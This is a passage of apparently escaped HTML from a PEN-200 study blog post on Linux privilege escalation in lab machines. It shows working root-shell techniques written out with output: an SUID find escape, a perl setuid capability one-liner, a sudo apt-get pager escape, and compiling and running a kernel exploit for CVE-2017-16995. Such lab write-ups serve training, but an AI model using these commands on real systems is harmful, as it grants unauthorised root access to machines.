+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ passwd
+Changing password for joe.
+Current password: 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Open another shell to further inspect the process.  We can find the PID of the &lt;code&gt;passwd&lt;/code&gt; proc by listing processes and filtering out the target name.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ ps -u -C passwd
+error: user name does not exist
+
+Usage:
+ ps [options]
+
+ Try &amp;#39;ps --help &amp;lt;simple|list|output|threads|misc|all&amp;gt;&amp;#39;
+  or &amp;#39;ps --help &amp;lt;s|l|o|t|m|a&amp;gt;&amp;#39;
+ for additional help text.
+
+For more details see ps(1).
+joe@debian-privesc:~$ ps u -C passwd
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root      1324  0.0  0.1   9364  2996 pts/0    S+   23:31   0:00 passwd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;As we see &lt;code&gt;passwd&lt;/code&gt; is running as the root user.&lt;/li&gt;
+&lt;li&gt;Necessary for it to access and modify &lt;code&gt;/etc/shadow&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can also inspect the real UID and effective UID assigned for the proc by inspecting the proc pseudo-filesystem, which allows us to interact with kernel info.  Using the passwd&amp;#39;s PID (1324) from previous output, we can inspect the content at &lt;code&gt;/proc/1932/status&lt;/code&gt; which provides a summary of the process attributes.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ cat /proc/1324/status
+Name:	passwd
+Umask:	0077
+State:	S (sleeping)
+Tgid:	1324
+Ngid:	0
+Pid:	1324
+PPid:	1251
+TracerPid:	0
+Uid:	1000	0	0	0
+Gid:	1000	1000	1000	1000
+FDSize:	256
+Groups:	24 25 29 30 44 46 109 112 116 117 1000 
+NStgid:	1324
+NSpid:	1324
+NSpgid:	1324
+NSsid:	1251
+VmPeak:	    9460 kB
+VmSize:	    9364 kB
+VmLck:	       0 kB
+VmPin:	       0 kB
+VmHWM:	    2996 kB
+VmRSS:	    2996 kB
+RssAnon:	     304 kB
+RssFile:	    2692 kB
+RssShmem:	       0 kB
+VmData:	     596 kB
+VmStk:	     132 kB
+VmExe:	      40 kB
+VmLib:	    2408 kB
+VmPTE:	      52 kB
+VmSwap:	       0 kB
+HugetlbPages:	       0 kB
+CoreDumping:	0
+Threads:	1
+SigQ:	0/7820
+SigPnd:	0000000000000000
+ShdPnd:	0000000000000000
+SigBlk:	0000000000080000
+SigIgn:	0000000000287007
+SigCgt:	0000000180000000
+CapInh:	0000000000000000
+CapPrm:	0000003fffffffff
+CapEff:	0000003fffffffff
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+NoNewPrivs:	0
+Seccomp:	0
+Speculation_Store_Bypass:	thread vulnerable
+Cpus_allowed:	3
+Cpus_allowed_list:	0-1
+Mems_allowed:	00000000,00000001
+Mems_allowed_list:	0
+voluntary_ctxt_switches:	4
+nonvoluntary_ctxt_switches:	3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;the &lt;code&gt;passwd&lt;/code&gt; bin behaves this way because of a special flag called Set-User-ID, SUID for short.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ ls -asl /usr/bin/passwd 
+64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The SUID flag is the &lt;code&gt;s&lt;/code&gt; in the above output.&lt;/li&gt;
+&lt;li&gt;The flag can be configured with &lt;code&gt;chmod u+s &amp;lt;fname&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;It sets the eUID of the proc to the exec owner UID (root)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The result is legitimate constrained PrivEsc, the SUID bin must be bug-free to avoid any misuse of the app.&lt;/p&gt;
+&lt;p&gt;A practical example, after completing manual enum, we&amp;#39;ll have discovered that the &lt;code&gt;find&lt;/code&gt; utility is misconfigured and has the SUID flag set.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We can abuse this by using &lt;code&gt;find&lt;/code&gt; to search well-known file, like our Desktop folder.&lt;/li&gt;
+&lt;li&gt;Once the file is found we can have &lt;code&gt;find&lt;/code&gt; perform an action through the &lt;code&gt;-exec&lt;/code&gt; param.&lt;/li&gt;
+&lt;li&gt;We want to exec a bash shell along with the &lt;a href=&quot;https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html&quot;&gt;Set Builtin&lt;/a&gt; &lt;code&gt;-p&lt;/code&gt; param.&lt;/li&gt;
+&lt;li&gt;Preventing the effective user from being reset.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ find /home/joe/Desktop/ -exec &amp;quot;/usr/bin/bash&amp;quot; -p \;
+bash-5.0# id
+uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+bash-5.0# whoami
+root
+bash-5.0# which find
+/usr/bin/find
+bash-5.0# ls -asl /usr/bin/find
+312 -rwsr-xr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We observe that the UID still belongs to &lt;code&gt;joe&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The eUID is now &lt;code&gt;root&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Another set of features subject to PrivEsc are &lt;a href=&quot;https://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;Linux capabilities&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Capabilities are extra attributes that can be applied to.&lt;/li&gt;
+&lt;li&gt;Procs.&lt;/li&gt;
+&lt;li&gt;Bins.&lt;/li&gt;
+&lt;li&gt;Services.&lt;/li&gt;
+&lt;li&gt;They assign specific privs normally reserved for admin ops.&lt;/li&gt;
+&lt;li&gt;Traffic capture.&lt;/li&gt;
+&lt;li&gt;Manipulating kernel modules.&lt;/li&gt;
+&lt;li&gt;Etc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Similar to SUID bins, if misconfigued capabilities could allow an attacker to elevate their privs to root.  To demonstrate let&amp;#39;s manually enum our target for bins with capabilities.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Run &lt;code&gt;getcap&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Recursive search &lt;code&gt;-r&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;From root folder &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Filtering out errors from output.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ /usr/sbin/getcap -r / 2&amp;gt;/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl5.28.1 = cap_setuid+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Two &lt;code&gt;perl&lt;/code&gt; bins stand out.&lt;/li&gt;
+&lt;li&gt;They have &lt;code&gt;setuid&lt;/code&gt; capabilities.&lt;/li&gt;
+&lt;li&gt;Effective and permitted &lt;code&gt;+ep&lt;/code&gt;
+&lt;em&gt;Even though they seem similar, capabilities, setuid, and the setuid flag are located in different places within the Linux ELF file format.&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To exploit this miscofig, we could check the GTFOBins website, which provides an organized list of UNIX bins and how they can be misused for PrivEsc.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;
+We search for &amp;quot;Perl&amp;quot; and find precise instructions on how to exploit the capabilities.  We&amp;#39;ll use the command which executes a shell along with POSIX directives enabling setuid.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ perl -e &amp;#39;use POSIX qw(setuid); POSIX::setuid(0); exec &amp;quot;/bin/sh&amp;quot;;&amp;#39;
+# id
+uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;Abusing Sudo&lt;/h5&gt;
+&lt;p&gt;On UNIX like systems, &lt;code&gt;sudo&lt;/code&gt; can be used to exec a command with elevated privs.  To use &lt;code&gt;sudo&lt;/code&gt; our un-priv user must be a member of the sudo group (Debian based distros).  The word sudo stands for &amp;quot;Superuser-Do&amp;quot;, think of it as changing the eUID of the executed command.&lt;/p&gt;
+&lt;p&gt;Custom configs of the sudo-related perms can be applied in the &lt;code&gt;/etc/sudoers&lt;/code&gt; file.  We can use the &lt;code&gt;-l&lt;/code&gt; or &lt;code&gt;--list&lt;/code&gt; option to list the allowed commands for the current user.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ sudo -l
+[sudo] password for joe: 
+Matching Defaults entries for joe on debian-privesc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User joe may run the following commands on debian-privesc:
+    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We see that &lt;code&gt;crontab&lt;/code&gt;, &lt;code&gt;tcpdump&lt;/code&gt;, and &lt;code&gt;apt-get&lt;/code&gt; are allowing sudo commands.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If the &lt;code&gt;/etc/sudoers&lt;/code&gt; configs are too permissive user&amp;#39;s could abuse to obtain permanent root.&lt;/p&gt;
+&lt;p&gt;Since the first of the 3 permitted commands does not allow us to edit &lt;code&gt;crontab&lt;/code&gt; it&amp;#39;s unlikely we can use it for PrivEsc.  The second command looks more promising so we browse GTFOBins for suggestions.  Running the command reveals an unexpected outcome.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+dropped privs to root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+62 packets received by filter
+0 packets dropped by kernel
+compress_savefile: execlp(/tmp/tmp.zkRMfxFPP3, /dev/null) failed: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We are prompted with a &amp;quot;permission denied&amp;quot; error.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To investigate, inspect &lt;code&gt;syslog&lt;/code&gt; for any occurrence of &lt;code&gt;tcpdump&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
+Nov  2 10:09:07 debian-privesc kernel: [  773.917028] audit: type=1400 audit(1698937747.856:24): apparmor=&amp;quot;DENIED&amp;quot; operation=&amp;quot;exec&amp;quot; profile=&amp;quot;/usr/sbin/tcpdump&amp;quot; name=&amp;quot;/tmp/tmp.zkRMfxFPP3&amp;quot; pid=2453 comm=&amp;quot;tcpdump&amp;quot; requested_mask=&amp;quot;x&amp;quot; denied_mask=&amp;quot;x&amp;quot; fsuid=0 ouid=1000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man8/auditd.8.html&quot;&gt;audit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Audit daemon logged our attempt.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://apparmor.net/&quot;&gt;AppArmor&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Was triggered blocking us.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;AppArmor is a kernel module providing mandatory access control (MAC) on Linux systems by running app specific profiles, it&amp;#39;s enabled by default on Debian 10.  We can verify AppArmor&amp;#39;s status as the root user using the &lt;code&gt;aa-status&lt;/code&gt; command.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ su - root
+Password:
+root@debian-privesc:~# aa-status
+apparmor module is loaded.
+20 profiles are loaded.
+18 profiles are in enforce mode.
+   /usr/bin/evince
+   /usr/bin/evince-previewer
+   /usr/bin/evince-previewer//sanitized_helper
+   /usr/bin/evince-thumbnailer
+   /usr/bin/evince//sanitized_helper
+   /usr/bin/man
+   /usr/lib/cups/backend/cups-pdf
+   /usr/sbin/cups-browsed
+   /usr/sbin/cupsd
+   /usr/sbin/cupsd//third_party
+   /usr/sbin/tcpdump
+...
+2 profiles are in complain mode.
+   libreoffice-oopslash
+   libreoffice-soffice
+3 processes have profiles defined.
+3 processes are in enforce mode.
+   /usr/sbin/cups-browsed (502)
+   /usr/sbin/cupsd (654)
+   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
+0 processes are in complain mode.
+0 processes are unconfined but have a profile defined.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can see &lt;code&gt;tcpdump&lt;/code&gt; is protected with an AppArmor profile.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The first two sudoers commands did not work, we check the third command &lt;code&gt;apt-get&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt-get changelog apt
+!/bin/sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Runs the &lt;code&gt;apt-get&lt;/code&gt; changelog command.&lt;/li&gt;
+&lt;li&gt;Invoking &lt;code&gt;less&lt;/code&gt; app from which we exec a bash shell.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ sudo apt-get changelog apt
+Get:1 store: apt 1.8.2.3 Changelog
+Fetched 459 kB in 0s (0 B/s)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;Exploiting Kernel Vulnerabilities&lt;/h5&gt;
+&lt;p&gt;Depending on the OS and kernel version, another excellent way to achieve PrivEsc are kernel exploits.&lt;/p&gt;
+&lt;p&gt;To demonstrate this vectore we must first gather info about the target by inspecting the &lt;code&gt;/etc/issue&lt;/code&gt; file,  As we learned earlier, this file contains text and system ID into that is printed to the login prompt on Linux machines.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@ubuntu-privesc:~$ cat /etc/issue
+Ubuntu 16.04.4 LTS \n \l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We must next inspect the kernel version and get the sys arch.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@ubuntu-privesc:~$ uname -r
+4.4.0-116-generic
+joe@ubuntu-privesc:~$ arch
+x86_64
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The target sys appears to be running Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 arch.  We can use this info with &lt;code&gt;searchsploit&lt;/code&gt; on our Kali machine to find kernel exploits that match the target.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Main keyword &lt;code&gt;linux kernel Ubuntu 16 Local Privilege Escalation&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Exclude anything below kernel version 4.4.0.&lt;/li&gt;
+&lt;li&gt;Exclude anything matching kernel version 4.9.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ searchsploit &amp;quot;linux kernel Ubuntu 16 Local Privilege Escalation&amp;quot; | grep &amp;quot;4.&amp;quot; | grep -v &amp;quot; &amp;lt; 4.4.0&amp;quot; | grep -v &amp;quot;4.8&amp;quot;
+Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.0 | linux_x86-64/local/42275.c
+Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17. | linux_x86/local/42276.c
+Linux Kernel (Ubuntu / Fedora / RedHat) - &amp;#39;Overlayfs&amp;#39;  | linux/local/40688.rb
+Linux Kernel (Ubuntu 17.04) - &amp;#39;XFRM&amp;#39; Local Privilege E | linux/local/44049.md
+Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu | linux_x86-64/local/9083.c
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - &amp;#39;Full-Ne | linux/local/15704.c
+Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/1 | linux/local/37292.c
+Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/1 | linux/local/37293.txt
+Linux Kernel 3.4 &amp;lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &amp;#39; | linux_x86-64/local/31347.c
+Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22 | linux/local/41999.txt
+Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &amp;#39;overlayfs&amp;#39;  | linux/local/39166.c
+Linux Kernel 4.4 (Ubuntu 16.04) - &amp;#39;BPF&amp;#39; Local Privileg | linux/local/40759.rb
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter &amp;#39; | linux_x86-64/local/40049.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - &amp;#39;double-fdput()&amp;#39; b | linux/local/39772.txt
+Linux Kernel 4.6.2 (Ubuntu 16.04.1) - &amp;#39;IP6T_SO_SET_REP | linux/local/40489.txt
+Linux Kernel &amp;lt; 2.6.34 (Ubuntu 10.10 x86) - &amp;#39;CAP_SYS_AD | linux_x86/local/15916.c
+Linux Kernel &amp;lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - &amp;#39;C | linux/local/14814.c
+Linux Kernel &amp;lt; 2.6.36.2 (Ubuntu 10.04) - &amp;#39;Half-Nelson. | linux/local/17787.c
+Linux Kernel &amp;lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Loc | linux/local/45010.c
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We will try the last exploit &lt;code&gt;linux/local/45010.c&lt;/code&gt; since it is newer and matches our kernel version.&lt;/li&gt;
+&lt;li&gt;It also targets any kernel version below 4.13.9.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We use &lt;code&gt;gcc&lt;/code&gt; on Linux to compile our exploit, matching the arch of our target.  This is imperative when the target does not have a compiler and we are forced to compile locally or in a sandbox env replicating the target.&lt;/p&gt;
+&lt;p&gt;Learning every detail of a Linux kernel exploit is beyond the scope of this module, we need to know how to compile the code.  First we will copy the exploit to our working dir and inspect the first lines for compilation instructions.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ head -n 20 45010.c
+/*
+  Credit @bleidl, this is a slight modification to his original POC
+  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c
+
+  For details on how the exploit works, please visit
+  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+
+  Tested on Ubuntu 16.04 with the following Kernels
+  4.4.0-31-generic
+  4.4.0-62-generic
+  4.4.0-81-generic
+  4.4.0-116-generic
+  4.8.0-58-generic
+  4.10.0.42-generic
+  4.13.0-21-generic
+
+  Tested on Fedora 27
+  4.13.9-300
+  gcc cve-2017-16995.c -o cve-2017-16995
+  internet@client:~/cve-2017-16995$ ./cve-2017-16995
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ gcc 45010.c -o cve-2017-16995      
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ ls          
+45010.c  cve-2017-16995
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;To assure compilation works as expected and if the target has GCC.&lt;/li&gt;
+&lt;li&gt;We can compile on target.&lt;/li&gt;
+&lt;li&gt;This assures the correct libs are used for the target arch.&lt;/li&gt;
+&lt;li&gt;Lowers the risks of cross compatibility issues.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ scp -o PubKeyAuthentication=no 45010.c joe@192.168.216.216:~/
+joe@192.168.216.216&amp;#39;s password: 
+45010.c
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;On target.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@ubuntu-privesc:~$ gcc 45010.c -o cve-2017-16995
+joe@ubuntu-privesc:~$ ls
+45010.c  cve-2017-16995
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can safely assume GCC compile it correctly as it output no errors.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can inspect the Linux ELF file arch with &lt;code&gt;file&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@ubuntu-privesc:~$ file cve-2017-16995 
+cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dd15fe9ed0b8bc7da0ee0d0dc643a5cb29f83bf1, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We are now ready to run our kernel exploit!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@ubuntu-privesc:~$ ./cve-2017-16995 
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff =&amp;gt; ffff880035232000
+[*] Leaking sock struct from ffff88003367f400
+[*] Sock-&amp;gt;sk_rcvtimeo at offset 472
+[*] Cred structure at ffff88007c0f1180
+[*] UID from cred structure: 1001, matches the current: 1001
+[*] hammering cred structure at ffff88007c0f1180
+[*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(joe)
+# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We have successfully obtained a root shell by exploiting a known kernel vuln.&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;/div&gt;
+
+  
+    &lt;footer class=&quot;blog-author-card&quot;&gt;
+      
+        &lt;img class=&quot;blog-author-avatar&quot; src=&quot;../assets/static/img/bunny-punx.webp&quot; alt=&quot;m4xx3d0ut avatar&quot;&gt;
+      
+      &lt;div class=&quot;blog-author-details&quot;&gt;
+        &lt;strong class=&quot;blog-author-name&quot;&gt;m4xx3d0ut&lt;/strong&gt;
+        
+          &lt;div class=&quot;blog-author-title&quot;&gt;Chaos Operator&lt;/div&gt;
+        
+        
+          &lt;p class=&quot;blog-author-bio&quot;&gt;Architect of the Neon Terminal Core and Professional Technologist.&lt;/p&gt;
+        
+        
+          &lt;ul class=&quot;blog-author-social&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/paul-k-a3a18196/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@m4xx3d0ut&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        
+      &lt;/div&gt;
+    &lt;/footer&gt;
+  
+
+  
+    &lt;nav class=&quot;blog-article-nav&quot; aria-label=&quot;Post navigation&quot;&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;previous&quot;
+        
+        href=&quot;../blog/pivoting-ssh.html&quot;
+        data-default-href=&quot;../blog/pivoting-ssh.html&quot;
+        data-default-fragment=&quot;../blog/fragments/pivoting-ssh.html&quot;
+        data-fragment-href=&quot;../blog/fragments/pivoting-ssh.html&quot;
+        data-target-slug=&quot;pivoting-ssh&quot;
+        data-post-slug=&quot;pivoting-ssh&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Previous&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 18 — Pivoting With SSH and Port Redirection&lt;/span&gt;
+      &lt;/a&gt;
+      &lt;span class=&quot;blog-article-nav-delimiter&quot; aria-hidden=&quot;true&quot;&gt;&amp;nbsp;•&amp;nbsp;&lt;/span&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;next&quot;
+        
+        href=&quot;../blog/ffmpeg-recipes.html&quot;
+        data-default-href=&quot;../blog/ffmpeg-recipes.html&quot;
+        data-default-fragment=&quot;../blog/fragments/ffmpeg-recipes.html&quot;
+        data-fragment-href=&quot;../blog/fragments/ffmpeg-recipes.html&quot;
+        data-target-slug=&quot;ffmpeg-recipes&quot;
+        data-post-slug=&quot;ffmpeg-recipes&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Next&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;FFmpeg Production Recipes&lt;/span&gt;
+      &lt;/a&gt;
+    &lt;/nav&gt;
+  
+&lt;/article&gt;
+
+    &lt;/div&gt;
+  &lt;/main&gt;
+
+  &lt;footer&gt;
+    
+      &lt;!-- footer partial (auto-generated) --&gt;
+&lt;div id=&quot;foot&quot;&gt;
+  &lt;p&gt;
+    &lt;center&gt;
+      Warning! Chaosandmajesty.com accepts no responsibility for your interactions with WOPR.
+    &lt;/center&gt;
+  &lt;/p&gt;
+&lt;/div&gt;
+
+    
+    &lt;div class=&quot;container footer-container&quot;&gt;
+      &lt;p class=&quot;footer-copy&quot;&gt;&amp;copy; 2025 Core&lt;/p&gt;
+    &lt;/div&gt;
+  &lt;/footer&gt;
+
+  &lt;button type=&quot;button&quot; class=&quot;blog-back-to-top&quot; aria-label=&quot;Back to top&quot;&gt;
+    ▲
+  &lt;/button&gt;
+
+  &lt;script&gt;
+    document.addEventListener(&#039;DOMContentLoaded&#039;, function() {
+      var toggleBtn = document.querySelector(&#039;.nav-toggle&#039;);
+      var headerEl = document.querySelector(&#039;header&#039;);
+      if (toggleBtn) {
+        toggleBtn.addEventListener(&#039;click&#039;, function() {
+          headerEl.classList.toggle(&#039;nav-open&#039;);
+        });
+      }
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+      </div>
+    </article>
+  
